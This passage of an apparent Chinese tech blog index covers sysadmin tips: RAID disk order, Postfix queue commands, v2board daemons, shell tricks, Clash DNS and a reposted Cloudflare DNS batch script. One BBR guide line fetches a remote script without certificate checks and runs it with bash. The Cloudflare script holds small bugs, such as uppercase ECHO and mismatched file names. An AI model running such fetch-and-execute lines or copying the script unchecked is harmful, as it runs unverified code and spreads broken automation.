使用openssl把pem证书转换为crt和key","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"shell","slug":"shell","permalink":"https://sobaigu.com/tags/shell/"}]},{"title":"蜗牛星际矿渣拯救及群辉NAS系统阵列盘顺序识别","slug":"dsm-nas-raid-order-numnber","date":"2021-09-17T02:29:40.000Z","updated":"2021-09-17T02:29:40.000Z","comments":true,"path":"dsm-nas-raid-order-numnber.html","permalink":"https://sobaigu.com/dsm-nas-raid-order-numnber.html","excerpt":"","text":"前言 在矿难高发的那段时间，搞了一台蜗牛星际的矿渣，攒了四块二手硬盘，装了黑群晖，算是组了个不靠谱NAS，给了小姐姐们一个家，直至今日，她们住得还是很宽裕！ 症状 某一天，这个矿渣点不亮了，系统BIOS都不显示。偶尔也能撞上开机成功，不能开机的时候面板上的灯跟电源虚接一样半闪不闪，但网卡的灯，机箱风扇正常，电源风扇半转不转…… 确认解决 作为理科生，自然是不能直接搬到修理店，CMOS放电后活了一次【有可能是偶然因素撞上了】，然后各种拆拆卸卸，最终还是要面对确认电源坏了的事实，拆开看了半天各种电子器件，已经超出认知范畴，忍痛花了三十多大洋在海鲜市场淘了个二手电源解决。 新问题 电源是换上了，可在之前拆拆卸卸的过程中，硬盘的位置被无意中忘记了搞乱了，虽然也不影响raid10数据和使用，但作为理科宅男，这怎么能忍，咱认的是0和1是有绝对区别的。 认识raid10 为了解决问题，顺便复习下以前学的知识，直接抄官方的文档： Synology RAID 10 采用“近”结构。 RAID 1 阵列由两个相邻硬盘组成，这些 RAID 1 阵列组合为RAID 0 。 获得之前的磁盘顺序 运行命令 cat /proc/mdstat 以找出 RAID 10 阵列所属的 md 。 这个步骤其实直接 df -ha 也能得到同样的 md 信息。 运行命令 mdadm -D /dev/md2 以检查 md2 的系统信息。 RAID设备列将按顺序列出RAID阵列中的硬盘，两个相邻硬盘为 RAID 1 阵列。 /dev/sda 表示插槽 1 中的硬盘，/dev/sdb 插槽 2 中的硬盘，依此类推。 如果未更改硬盘顺序，则结果应如步骤2所示。如果已更改，下图显示了使用命令 ·mdadm -D /dev/md2·的示例结果。 原始硬盘1（/dev/sda3）现在位于插槽 3 中，并且将成为 dev/sdc3 和RAID设备 0 。 原始硬盘2（/dev/sdb3）现在位于插槽 5 中，并且会成为 dev/sde3 和RAID设备 1 。 通过以上知识整理，我们可知每块硬盘在raid中的顺序，此时我们可以按对应的顺序调换插槽即可，省心点可在硬盘上做好顺序编号。 注意：蜗牛星际B双的插槽顺序是自右向左，也就是靠近机箱电源开关位置的插槽是最后一块。 参考文档 如何检查Synology RAID 10的结构？","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"Postfix常用命令和邮件队列管理（queue）- 转","slug":"postfix-command-list","date":"2021-08-23T02:39:40.000Z","updated":"2021-08-23T02:39:40.000Z","comments":true,"path":"postfix-command-list.html","permalink":"https://sobaigu.com/postfix-command-list.html","excerpt":"","text":"前言 本文主要介绍一下postfix的常用命令及邮件队列的管理。 Postfix有以下四种邮件队列，均由管理队列的进程统一进行管理： maildrop：本地邮件放置在 maildrop 中，同时也被拷贝到 incoming 中。 incoming：放置正在到达队列或管理进程尚未发现的邮件。 active：放置队列管理进程已经打开了并正准备投递的邮件，该队列有长度的限制。 deferred：放置不能被投递的邮件。可能是推迟发送的邮件 基本管理命令 启动postfix：/usr/sbin/postfix start 停止postfix：/usr/sbin/postfix stop 检查postfix配置文件：/usr/sbin/postfix check 显示Postfix当前生效的配置信息：postconf -n 重新读取postfix配置文件：/usr/sbin/postfix reload 邮件管理命令 查看队列中的邮件：mailq或postqueue -p 查看队列大小：mailq | wc -l或postqueue -p | wc -l 查看信件內容：postcat -q Queue_ID 强制发送队列中的邮件：/usr/sbin/postfix flush或postqueue -f 暂缓发送队列中的问题邮件：postsuper -h Queue_ID或postsuper -h ALL deferred 解除暂缓发送的邮件：postsuper -H Queue_ID或postsuper -H ALL deferred 重新加入队列：postsuper -r Queue_ID或postsuper -r ALL 刪除指定邮件：postsuper -d Queue_ID 清空队列中的邮件：postsuper -d ALL 删除队列中有问题的邮件（正在deferred列表中的邮件，直接删除邮件文件，可看出哪些信被刪除了 ): 123postsuper -d ALL deferredfind /var/spool/postfix/deferred -type f -exec rm -vf &#123;&#125; \\;# find /var/spool/postfix/defer -type f -exec rm -vf &#123;&#125; \\; 列出所有问题邮件（目前所有无法发送的邮件）： 1find /var/spool/postfix/deferred -type f -exec ls -l --time-style=+%Y-%m-%d_%H:%M:%S &#123;&#125; \\; 删除已经3天未发出的邮件 1find /var/spool/postfix/deferred -type f -mtime +3 -exec rm -f &#123;&#125; \\; 删除超过5天的问题邮件的退信记录（超过5天的 defer 列表中的退信） 1find /var/spool/postfix/defer -type f -mtime +5 -exec rm -f &#123;&#125; \\; 一些相关的日志 查看系统日志： 1tail -f /var/log/messages 查看邮件日志：基本很全面，几乎所有遇到的邮件问题都可以通过该日志来处理 1tail -f /var/log/maillog maildrop 相关 1tail -f /var/log/maildrop.log clamd 相关： 12tail -f /var/log/clamav/clamd.logtail -f /var/log/clamav/freshclam.log 原文出处：https://www.cnblogs.com/tssc/p/7512437.html","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"v2board面板统计空白，无邮件及TG通知问题","slug":"v2board-no-message-tg-email","date":"2021-06-21T14:11:57.000Z","updated":"2021-06-21T14:11:57.000Z","comments":true,"path":"v2board-no-message-tg-email.html","permalink":"https://sobaigu.com/v2board-no-message-tg-email.html","excerpt":"","text":"前言 v2board 搭起来体验了一把，颜值很高，功能也比较核心显得比较简练，能更满足基本的使用需求。 但这个面板文档也比较简练，想必是高手们也不屑于写些基础文档，玩这个面板的也能自己解决问题。 问题现象 首页服务器信息统计表空白 TG消息通知没有 收不到邮件，包括注册，找回密码等邮件都收不到 原因及解决 v2board 依赖 pm2 或者 Supervisor 进程守护服务管理发送邮件，触发TG通知等，如果 pm2 服务不正常就会出现如上问题现象。 解决办法就是确保 pm2 服务正常运行。我们打开面板根目录下的 pm2.yaml ，可以看到如下内容： 12345apps: - name : &#x27;V2Board&#x27; script : &#x27;php artisan queue:work --queue=send_email,send_telegram,stat_server&#x27; instances: 4 out_file : &#x27;./storage/logs/queue/queue.log&#x27; 从中可见，该服务调用PHP任务，其中就有发送邮件，发送TG通知和服务器统计的功能，刚好对应前文的3个问题现象。 我们可以用以下命令重启 pm2 服务。如果装有宝塔之内的，也可以在宝塔界面添加 pm2.yaml 为启动文件启动。 1pm2 restart pm2.yaml 启动服务后，使用 pm2 status 命令可见服务运行状态： 12345678┌─────┬────────────┬─────────────┬─────────┬─────────┬──────────┬────────┬──────┬───────────┬──────────┬──────────┬──────────┬──────────┐│ id │ name │ namespace │ version │ mode │ pid │ uptime │ ↺ │ status │ cpu │ mem │ user │ watching │├─────┼────────────┼─────────────┼─────────┼─────────┼──────────┼────────┼──────┼───────────┼──────────┼──────────┼──────────┼──────────┤│ 0 │ V2Board │ default │ N/A │ fork │ 5479 │ 4D │ 0 │ online │ 0% │ 52.1mb │ root │ disabled ││ 1 │ V2Board │ default │ N/A │ fork │ 5480 │ 4D │ 0 │ online │ 0% │ 52.0mb │ root │ disabled ││ 2 │ V2Board │ default │ N/A │ fork │ 5481 │ 4D │ 0 │ online │ 0% │ 53.2mb │ root │ disabled ││ 3 │ V2Board │ default │ N/A │ fork │ 5482 │ 4D │ 0 │ online │ 0% │ 52.2mb │ root │ disabled │└─────┴────────────┴─────────────┴─────────┴─────────┴──────────┴────────┴──────┴───────────┴──────────┴──────────┴──────────┴──────────┘ 2022年4月15日更新 supervisor守护配置 今天看了下最新代码，官方已经推荐转向使用 supervisor 守护。 supervisor 安装方法不表，删库塔应用商店去找到点下安装就行了，那就简单记录下配置方法： 启动 supervisor，点击界面顶部 add new daemon Name 随便填，如：v2b Run User 选择 www ， Run Dir 选择网站根目录，不是 public 目录 Start Command 填上：php artisan horizon 以上填完保存后启动即可，效果相当于在网站根目录下执行了 php artisan horizon 命令，supervisor 会一直守护该命令执行。 以上示例为了简洁，没有填PHP命令程序完整路径，某些系统没做PHP命令链接，可能会出现 PHP版本不匹配，PHP命令不存在 之类错误，可参考此文解决：解决“Peer fingerprint did not match”错误提示","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"}]},{"title":"让 Debian 系统终端环境分色显示","slug":"ll-colorized-in-ssh-terminal","date":"2021-05-13T04:57:37.000Z","updated":"2021-05-13T04:57:37.000Z","comments":true,"path":"ll-colorized-in-ssh-terminal.html","permalink":"https://sobaigu.com/ll-colorized-in-ssh-terminal.html","excerpt":"","text":"前言 听说后面 CentOS 系统代码直接用的是预发布源码，也就是相当于 CentOS 成了 RedHat 的测试版，寻思着适应下其他发行版。以前经常用 Ubuntu，干脆体验下上游 Debian。 习惯了 ll ，结果居然提示命令不存在，而且一个 +x 程序居然不额外展示，稍微有点不适应，我们需要手动开启终端显色。 方法：修改 .bashrc 首先看下默认的终端特性配置文件： 1root@xxx:~# cat .bashrc 可见默认就有关于 ll 的相关配置，只是默认是注释状态的： 123456789101112131415161718# ~/.bashrc: executed by bash(1) for non-login shells.# Note: PS1 and umask are already set in /etc/profile. You should not# need this unless you want different defaults for root.# PS1=&#x27;$&#123;debian_chroot:+($debian_chroot)&#125;\\h:\\w\\$ &#x27;# umask 022# You may uncomment the following lines if you want `ls&#x27; to be colorized:# export LS_OPTIONS=&#x27;--color=auto&#x27;# eval &quot;`dircolors`&quot;# alias ls=&#x27;ls $LS_OPTIONS&#x27;# alias ll=&#x27;ls $LS_OPTIONS -l&#x27;# alias l=&#x27;ls $LS_OPTIONS -lA&#x27;## Some more alias to avoid making mistakes:# alias rm=&#x27;rm -i&#x27;# alias cp=&#x27;cp -i&#x27;# alias mv=&#x27;mv -i&#x27; 我们只需要将我们要d命令相关行取消注释即可： 12345678# You may uncomment the following lines if you want `ls&#x27; to be colorized:export LS_OPTIONS=&#x27;--color=auto&#x27;eval &quot;`dircolors`&quot;alias ls=&#x27;ls $LS_OPTIONS&#x27;alias ll=&#x27;ls $LS_OPTIONS -l&#x27;alias l=&#x27;ls $LS_OPTIONS -lA&#x27;## Some more alias to avoid making mistakes: 改完记得保存，退出重登或者使用下方命令重载配置： 1source .bashrc 再次 ls 或者 ll 就能出现熟悉的显色了， +x 文件绿色显示，一眼就知道这是个可执行程序，这样就顺眼了。","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"shell脚本中自动获取 GitHub 最新版本号","slug":"shell-get-lastest-version-from-github","date":"2021-03-15T13:38:09.000Z","updated":"2021-03-15T13:38:09.000Z","comments":true,"path":"shell-get-lastest-version-from-github.html","permalink":"https://sobaigu.com/shell-get-lastest-version-from-github.html","excerpt":"为了方便，偶尔写个小脚本，要取 GitHub最新版本号，可以通过 GitHub 提供的 API 完成。","text":"为了方便，偶尔写个小脚本，要取 GitHub最新版本号，可以通过 GitHub 提供的 API 完成。 获取Github最新版本 利用 GitHub API 获取最新 Releases 的版本号，以 iina 为例： 1wget -qO- -t1 -T2 &quot;https://api.github.com/repos/lhc70000/iina/releases/latest&quot; | grep &quot;tag_name&quot; | head -n 1 | awk -F &quot;:&quot; &#x27;&#123;print $2&#125;&#x27; | sed &#x27;s/\\&quot;//g;s/,//g;s/ //g&#x27; 或者借助第三方工具 jq ： 1wget -qO- -t1 -T2 &quot;https://api.github.com/repos/lhc70000/iina/releases/latest&quot; | jq -r &#x27;.tag_name&#x27; 代码解释 主字段 https://api.github.com/repos/lhc70000/iina/releases/latest 这里用的是 GitHub 的官方 API，格式为 https://api.github.com/repos/&#123;项目名&#125;/releases/latest 打开上述链接后，可见包含下述字段的内容： 123456&quot;html_url&quot;: &quot;https://github.com/lhc70000/iina/releases/tag/v0.0.15.1&quot;,&quot;id&quot;: 10774475,&quot;node_id&quot;: &quot;MDc6UmVsZWFzZTEwNzc0NDc1&quot;,&quot;tag_name&quot;: &quot;v0.0.15.1&quot;,&quot;target_commitish&quot;: &quot;0.0.15.1&quot;,&quot;name&quot;: &quot;v0.0.15.1&quot;, 那么这里的 tag_name 后面的值就是我们所需要的东西。 wget 参数 wget -qO- -t1 -T2 ，在这里我们使用了 4 个参数，分别是 q , O- , t1 , T2 -q : q 就是 quiet 的意思了，没有该参数将会显示从请求到输出全过程的所有内容，这肯定不是我们想要的。 -O-: -O 是指把文档写入文件中，而 -O- 是将内容写入标准输出，而不保存为文件。（注：这里是大写英文字母 O (Out)，不是数字 0 ） -t1 : 设定最大尝试链接次数为 1 次，防止失败后反复获取，导致后续脚本无法执行。 -T2 : 设定响应超时的秒数为 2 秒，防止失败后反复获取，导致后续脚本无法执行。 筛选参数 jq -r '.tag_name' ：该命令需要先安装 jq ，.tag_name 取得该键值，-r 参数删除键值中的 &quot;，更多可参考：常用 linux jq 命令语法整理 grep &quot;tag_name&quot; : grep 是 Linux 一个强大的文本搜索工具，在本代码中输出 tag_name 所在行，即输出 &quot;tag_name&quot;: &quot;v0.0.15.1&quot;, head -n 1 : head -n 用于显示输出的行数，考虑到某些项目可能存在多个不同版本的 tag_name ，这里我们只要第一个。 awk -F &quot;:&quot; '&#123;print $2&#125;' : awk 主要用于文本分析，在这里指定 : 为分隔符，将该行切分成多列，并输出第二列。于是我们得到了 (空格)&quot;v0.0.15.1&quot;, sed 's/\\&quot;//g;s/,//g;s/ //g' : 在这里 sed 用于数据查找替换，如 sed 's/要被取代的字串/新的字串/g' ，因此本段命令可分为 3 个，以 ; 分隔。s/\\&quot;//g 即将 &quot; 删除（反斜杠是为了防止引号被转义），以此类推，最终留下我们需要的内容：v0.0.15.1 。 应用 还是以上面那个项目为例，提取版本号自然是想下载，其应用下载路径为： 1https://github.com/iina/iina/releases/download/v0.0.15.1/IINA.v0.0.15.1.dmg 对比发现，我们只需要将版本号换成对应的变量即可： 1234# 定义版本变量tag=$(wget -qO- -t1 -T2 &quot;https://api.github.com/repos/lhc70000/iina/releases/latest&quot; | jq -r &#x27;.tag_name&#x27;)# 下载链接替换为变量wget https://github.com/iina/iina/releases/download/$&#123;tag&#125;/IINA.$&#123;tag&#125;.dmg","categories":[{"name":"学编程","slug":"学编程","permalink":"https://sobaigu.com/categories/%E5%AD%A6%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"shell","slug":"shell","permalink":"https://sobaigu.com/tags/shell/"}]},{"title":"解决Clash节点全部超时/失败/timeout不能联网","slug":"clash-timeout-failed-by-dns","date":"2021-03-10T01:14:15.000Z","updated":"2021-03-10T01:14:15.000Z","comments":true,"path":"clash-timeout-failed-by-dns.html","permalink":"https://sobaigu.com/clash-timeout-failed-by-dns.html","excerpt":"","text":"前言 Clash是个优秀的项目，但其高度配置化的功能对新手来说还是稍显复杂，所以如果不是有故障，一般我们就界面上点几下能用就好。 有时候为了干净网络，会在Clash配置中内置DNS功能，但这个功能在某些时候却直接断了，导致基本功能未实现。 现象 之前用的好好的，在某个敏感时期，节点服务器能更新或者更新订阅时候就直接超时了，即便更新下来节点全部显示超时或者失败，同一个服务器，别的客户端如 netch 等却用得好好的，此时Clash软件里手动强连也无法使用。 该现象影响包含所有Clash项目，包括 ClashX 和 Clash for Android 。 解决 排除其他问题 先确定不是其他问题导致，如：节点服务器真的可以用，系统时间与服务器上一致，一般都是标准北京时间，如果有时差就同步好，可以打开这个网页校对下：http://www.time163.com/ 关闭内置DNS 用文本编辑器打开编辑Clash的 yml 配置文件，将 dns 下的 enable 值改为 false ，此处以 Clash for Windows 为例，macOS上的 ClashX 配置格式也一样的，入口自己找。 12345678910111213mixed-port: 7890allow-lan: truebind-address: &#x27;*&#x27;mode: rulelog-level: infoexternal-controller: &#x27;127.0.0.1:9090&#x27;dns: enable: false //这个值`true` 改为 `false` ipv6: false default-nameserver: [223.5.5.5, 119.29.29.29] enhanced-mode: redir-host fake-ip-range: 198.18.0.1/16 use-hosts: true 如果提示 yml 文件未关联，就自己去找到配置文件用文本编辑器打开就行，Clash for Windows 的配置一般在 %USERPROFILE%\\.config\\clash\\profiles 下面，复制该路径直接粘贴打资源管理器地址栏可直达。 %USERPROFILE% 是系统变量，表示用户目录，如登录的用户名为 xyz ，那么这个路径一般就表示 C:\\Users\\xyz\\ 。 修改完保存，然后再看效果就可以了。如果你用的是机场提供的服务，让机场主修改该默认配置，然后你再客户端更新下订阅应该就可以自动完成了。","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"加速代理","slug":"加速代理","permalink":"https://sobaigu.com/tags/%E5%8A%A0%E9%80%9F%E4%BB%A3%E7%90%86/"}]},{"title":"利用CloudFlare API批量添加域名并添加解析记录","slug":"cloudflare-manage-dns-auto","date":"2021-03-07T14:01:50.000Z","updated":"2021-03-07T14:01:50.000Z","comments":true,"path":"cloudflare-manage-dns-auto.html","permalink":"https://sobaigu.com/cloudflare-manage-dns-auto.html","excerpt":"这是一篇转载的文章，为防失踪，先贴出来，后面慢慢消化，也可直接看文末原文。 CloudFlare是一家DNS供应商，他有提供很多服务（HTTPS/CDN等等），具体的大家可以自己去官网看一下：www.cloudflare.com CloudFlare建议使用linux的 curl 命令来开发对应的API功能。","text":"这是一篇转载的文章，为防失踪，先贴出来，后面慢慢消化，也可直接看文末原文。 CloudFlare是一家DNS供应商，他有提供很多服务（HTTPS/CDN等等），具体的大家可以自己去官网看一下：www.cloudflare.com CloudFlare建议使用linux的 curl 命令来开发对应的API功能。 本文件一共有5个文件配合使用： domians_list.txt ：用来存放需要添加的域名 cloudflare.env ：存放各种变量 cloudflare.sh ：存放linux命令，执行时也是执行这一个脚本即可 filter_zone_id.py ：用于将CloudFlare返回的数据过滤(过滤出域名及其区域ID) filter_dns_id.py ：用于将CloudFlare返回的数据过滤(过滤出解析记录及其记录ID) domians_list.txt 就是把顶级域名写到里面，一行一个,如： 123a.comb.comc.com cloudflare.env 1234567891011121314151617181920212223#!/bin/bash#通用变量#当前目录PWD=$(pwd)PYTHON=$(which python)#这里DNS指的是解析记录#CloudFlare的登录账号CF_API_EMAIL=CloudFlare的登录账号#在用户信息里面查看“Global KEY”CF_API_KEY=在用户信息里面查看“Global KEY”#组织名ORGANIZATION_NAME=&quot;组织名&quot;#组织IDORGANIZATION_ID=&quot;组织ID&quot;#解析参数# DNS_TYPE=A/CNAME/AAAADNS_TYPE=解析类型#DNS_SUBDOMAIN=子解析记录DNS_SUBDOMAIN=CONTENT_A=域名需要解析的IPCONTENT_CNAME=域名需要解析的CNAME cloudflare.sh 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#!/bin/bashsource ./cloudflare.env#新增域名for DOMAIN in $(cat $PWD/domain_list.txt)do curl -X POST -H &quot;X-Auth-Key: $&#123;CF_API_KEY&#125;&quot; \\ -H &quot;X-Auth-Email: $&#123;CF_API_EMAIL&#125;&quot; \\ -H &quot;Content-Type: application/json&quot; &quot;https://api.cloudflare.com/client/v4/zones&quot; \\ --data &#x27;&#123;&quot;name&quot;:&quot;&#x27;&quot;$&#123;DOMAIN&#125;&quot;&#x27;&quot;,&quot;jump_start&quot;:true,&quot;organization&quot;:&#123;&quot;name&quot;:&quot;&#x27;&quot;$&#123;ORGANIZATION_NAME&#125;&quot;&#x27;&quot;,&quot;id&quot;:&quot;&#x27;&quot;$&#123;ORGANIZATION_ID&#125;&quot;&#x27;&quot;&#125;&#125;&#x27; &gt;&gt; $PWD/get_zone_id.cf ECHO -e &quot;\\n&quot; &gt;&gt; $PWD/get_zone_id.cfdone#get_zone_id.cf -- 存放新增域名时Cloudflare返回的JSON 数据#filter_zone_id.py -- 用于从 &quot;get_zone_id.cf&quot; 中过滤出域名及其相对应的区域ID并写入文件 &quot;zone_id.cf&quot;#执行python脚本，过滤出域名的区域ID$PYTHON $PWD/filter_zone_id.py#获取DNS ID列表while read linedo ZONE_NAME=$(ECHO &quot;$line&quot; | awk &#x27;&#123;print $1&#125;&#x27;) ZONE_ID=$(ECHO &quot;$line&quot; | awk &#x27;&#123;print $2&#125;&#x27;) curl -X GET &quot;https://api.cloudflare.com/client/v4/zones/$&#123;ZONE_ID&#125;/dns_records&quot; \\ -H &quot;X-Auth-Email: $&#123;CF_API_EMAIL&#125;&quot; -H &quot;X-Auth-Key: $&#123;CF_API_KEY&#125;&quot; \\ -H &quot;Content-Type: application/json&quot; &gt;&gt; $PWD/get_dns_id.cf ECHO -e &quot;\\n&quot; &gt;&gt; $PWD/get_dns_id.cfdone &lt; $PWD/zone_id.cf#get_dns_id.cf -- 存放获取DNS_ID时Cloudflare返回的JSON 数据#filter_dns_id.py -- 用于从 &quot;get_dns_id.cf&quot; 中过滤出DNS_ID及其DNS_NAME并写入文件 &quot;dns_id.cf&quot;#执行python脚本，过滤出DNS_ID$PYTHON $PWD/filter_dns_id.py#删除DNS记录#删除DNS记录还需要指定区域ID，每个域名的区域DI不同，所以进行一个判断，判断DNS_NAME是否模糊匹配之前取到的ZONE_NAME#如果匹配则使用这个ZONE_IDwhile read zonedo ZONE_NAME=$(ECHO &quot;$zone&quot; | awk &#x27;&#123;print $1&#125;&#x27;) ZONE_ID=$(ECHO &quot;$zone&quot; | awk &#x27;&#123;print $2&#125;&#x27;) while read dns do DNS_NAME=$(ECHO &quot;$dns&quot; | awk &#x27;&#123; print $1 &#125;&#x27;) DNS_ID=$(ECHO &quot;$dns&quot; | awk &#x27;&#123; print $2 &#125;&#x27;) if [[ &quot;*$DNS_NAME&quot; =~ &quot;$ZONE_NAME&quot; ]] then curl -X DELETE &quot;https://api.cloudflare.com/client/v4/zones/$&#123;ZONE_ID&#125;/dns_records/$&#123;DNS_ID&#125;&quot; \\ -H &quot;X-Auth-Email:$&#123;CF_API_EMAIL&#125;&quot; \\ -H &quot;X-Auth-Key:$&#123;CF_API_KEY&#125;&quot; \\ -H &quot;Content-Type:application/json&quot; fi done &lt; $PWD/dns_id.cfdone &lt; $PWD/zone_id.cf#增加DNS记录#TTL=1 为自动#proxied=true 使用CF的CDN,等于false是不使用#data传入变量格式： &quot;&#x27;&quot;$EVN&quot;&#x27;&quot;#设置变量while read linedo ZONE_NAME=$(ECHO &quot;$line&quot; | awk &#x27;&#123;print $1&#125;&#x27;) ZONE_ID=$(ECHO &quot;$line&quot; | awk &#x27;&#123;print $2&#125;&#x27;) curl -X POST &quot;https://api.cloudflare.com/client/v4/zones/$&#123;ZONE_ID&#125;/dns_records&quot; \\ -H &quot;X-Auth-Email:$&#123;CF_API_EMAIL&#125;&quot; \\ -H &quot;X-Auth-Key:$&#123;CF_API_KEY&#125;&quot; \\ -H &quot;Content-Type:application/json&quot; \\ --data &#x27;&#123;&quot;type&quot;:&quot;A&quot;,&quot;name&quot;:&quot;@&quot;,&quot;content&quot;:&quot;&#x27;&quot;$&#123;CONTENT_A&#125;&quot;&#x27;&quot;,&quot;ttl&quot;:1,&quot;priority&quot;:10,&quot;proxied&quot;:true&#125;&#x27; curl -X POST &quot;https://api.cloudflare.com/client/v4/zones/$&#123;ZONE_ID&#125;/dns_records&quot; \\ -H &quot;X-Auth-Email:$&#123;CF_API_EMAIL&#125;&quot; \\ -H &quot;X-Auth-Key:$&#123;CF_API_KEY&#125;&quot; \\ -H &quot;Content-Type:application/json&quot; \\ --data &#x27;&#123;&quot;type&quot;:&quot;CNAME&quot;,&quot;name&quot;:&quot;www&quot;,&quot;content&quot;:&quot;&#x27;&quot;$&#123;CONTENT_CNAME&#125;&quot;&#x27;&quot;,&quot;ttl&quot;:1,&quot;priority&quot;:10,&quot;proxied&quot;:false&#125;&#x27; curl -X POST &quot;https://api.cloudflare.com/client/v4/zones/$&#123;ZONE_ID&#125;/dns_records&quot; \\ -H &quot;X-Auth-Email:$&#123;CF_API_EMAIL&#125;&quot; \\ -H &quot;X-Auth-Key:$&#123;CF_API_KEY&#125;&quot; \\ -H &quot;Content-Type:application/json&quot; \\ --data &#x27;&#123;&quot;type&quot;:&quot;CNAME&quot;,&quot;name&quot;:&quot;m&quot;,&quot;content&quot;:&quot;&#x27;&quot;$&#123;CONTENT_CNAME&#125;&quot;&#x27;&quot;,&quot;ttl&quot;:1,&quot;priority&quot;:10,&quot;proxied&quot;:false&#125;&#x27;done &lt; $PWD/zone_id.cf filter_zone_id.py 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#!/usr/bin/env python#*- coding:utf-8 -*#打开文件获取添加域名成功后返回的数据，然后获取到域名的区域ID#通过区域ID获取DNS列表import jsonimport osimport traceback#traceback 完整输出报错信息#str(e) 只给出异常信息，不包括异常信息的类型，如1/0的异常信息#repr(e) 给出较全的异常信息，包括异常信息的类型，如1/0的异常信息PWD = os.getcwd()PWD_GET = PWD+&#x27;/get_zone_id.cf&#x27;PWD_ZONE = PWD+&#x27;/zone_id.cf&#x27;ERROR_FILE = PWD+&#x27;/zone_error.log&#x27;#读取添加域名时返回的字符串，并且循环写入字典，以便于过滤出域名的区域IDwith open (PWD_GET,&#x27;r&#x27;) as file: i = 0 j = 0 dict = &#123;&#125; list = [] for line in file: if line.strip == &quot; &quot; or line == &quot;\\n&quot; or line == &quot; \\n&quot;: continue try: dict[i]=json.loads(line) i+=1 except Exception as e: j+=1 with open (ERROR_FILE,&#x27;a+&#x27;) as file: title = &quot;----------\\t\\t第%d条报错信息\\t\\t---------&quot;%(j) + &quot;\\n&quot; #info = &quot;报错信息：&quot; + traceback.format_exc() + &quot;\\n&quot; info = &quot;报错信息：&quot; + repr(e) + &quot;\\n&quot; mation = &quot;报错行：&quot; + line + &quot;\\n&quot; file.writelines(title) file.writelines(info) file.writelines(mation) continue#获取所有的key，然后进行循环遍历，获取每个域名的区域IDkeys_list = dict.keys()for key in keys_list: ID=dict[key][&#x27;result&#x27;][&#x27;id&#x27;] NAME=dict[key][&#x27;result&#x27;][&#x27;name&#x27;] with open (PWD_ZONE,&#x27;a+&#x27;) as file: line = NAME + &quot; &quot; + ID + &quot;\\n&quot; file.writelines(line) filter_dns_id.py 1234567891011121314151617181920212223242526272829303132333435#!/usr/bin/env python#*- coding:utf-8 -*#打开文件读取cloudflare返回的DNS IDimport jsonimport osPWD = os.getcwd()PWD_GET = PWD+&#x27;/get_dns_id.cf&#x27;PWD_DNS = PWD+&#x27;/dns_id.cf&#x27;#读取获取DNS ID时返回的字符串，并且循环写入字典，以便于过滤出DNS IDwith open (PWD_GET,&#x27;r&#x27;) as file: i = 0 dict = &#123;&#125; for line in file: if line.strip == &quot; &quot; or line == &quot;\\n&quot; or line == &quot; \\n&quot;: continue dict[i]=json.loads(line) i+=1key_list = dict.keys()for key in key_list: list = dict[key][&#x27;result&#x27;] #一个域名可能有多个DNS记录，cloudflare返回的是一个列表,列表中是一个一个的字典， #一个key-values代表一个DNS记录，所以这里需要遍历列表中的字典 #通过取列表的索引值，循环每一个位置的字典 for i in list: with open (PWD_DNS,&#x27;a+&#x27;) as file: line = i[&#x27;name&#x27;] + &quot; &quot; + i[&#x27;id&#x27;] + &quot;\\n&quot; file.writelines(line) 参考文档 CloudFlare API：批量添加域名并添加解析记录","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"shell","slug":"shell","permalink":"https://sobaigu.com/tags/shell/"}]},{"title":"OpenVZ架构一键开启BBR加速的方法","slug":"linux-bbr-openvz","date":"2021-03-06T04:06:38.000Z","updated":"2021-03-06T04:06:38.000Z","comments":true,"path":"linux-bbr-openvz.html","permalink":"https://sobaigu.com/linux-bbr-openvz.html","excerpt":"","text":"前言 BBR是由Google开发的一款开源的阻塞控制算法，主要是用来给服务器加速的。打个比方，比如你有一台搬瓦工的VPS，你在上面架设了个网站，正常情况下你在国内下载你VPS上面的文件，可能平均速度只有100kb/s，但是如果你安装并开启了BBR，可能这个下载速度会提升到1M/s，这就是BBR的作用。当然，BBR的作用还不止这些，总之，BBR就是使用tcp暴力发包的原理进行实现提速。 OpenVZ架构的VPS，好处是便宜，丢了不心疼。坏处是内核不独立，各种受限。BBR出世之时本是不支持OpenVZ的，后来有魔改版问世才有了支持，但一般来说仍有前置条件：必须有 TUN/TAP 功能。此功能在一些服务商的VPS是没有的，也有一些提供但默认是关闭的，需要在面板中手动开启。 方案1：BBRPLUS lkl-haproxy lkl-linux+haproxy hack 版本 bbrplus，在 OpenVZ 工作良好。 要求: 开启 TUN/TAP 和至少 256M 空闲内存。 使用方法 复制以下内容，粘贴到终端中执行，支持 Alpine / Debian / Ubuntu / CentOS。 1wget --no-check-certificate --no-cache -O lkl-haproxy.sh https://github.com/mzz2017/lkl-haproxy/raw/master/lkl-haproxy.sh &amp;&amp; bash lkl 执行后按提示输入对应的内容即可： 12345[Info] 选择你要使用的功能: 1.安装 lkl bbrplus2.检查 lkl bbrplus运行状态3.卸载 lkl bbrplus输入数字以选择: 方案2：Rinetd 方式 Rinetd 就是另外一种 lkl 